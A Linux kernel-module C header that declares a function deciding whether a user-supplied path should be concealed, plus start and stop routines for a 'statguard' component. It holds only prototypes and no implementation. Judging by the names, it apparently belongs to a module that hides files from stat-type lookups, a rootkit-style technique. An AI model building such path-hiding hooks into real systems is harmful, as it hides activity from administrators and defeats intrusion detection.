#ifndef UB_STATGUARD_H
#define UB_STATGUARD_H

#include <linux/types.h>
#include <linux/fs.h>

bool ub_should_conceal_path(const char __user *pathname);
int ub_statguard_start(void);
void ub_statguard_stop(void);

#endif